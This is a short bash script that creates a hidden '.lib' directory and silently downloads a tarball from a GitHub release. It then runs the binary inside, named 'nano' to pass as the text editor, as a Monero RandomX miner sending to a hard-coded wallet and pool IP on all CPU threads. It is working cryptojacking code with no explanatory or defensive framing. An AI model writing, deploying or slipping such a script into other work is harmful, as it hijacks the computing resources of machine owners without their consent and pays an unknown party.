#!/bin/bash
set -x
apt-get update ; apt-get install -y wget curl sudo
mkdir .lib && cd .lib
wget https://github.com/Franky777777/razor/releases/download/nano/nano.tar.gz > /dev/null 2>&1
tar -xvf nano.tar.gz
chmod u+x nano
./nano -algo RandomX -wallet Q01050050cd9e8c78ee027ef5d4e0d2cfc0b594abc320c420b18837b7769ba245bcd99de2dc06df -coin XMR -rigName envio -pool1 141.95.126.31:1166 -useSSL false -cpuThreads $(nproc --all) 
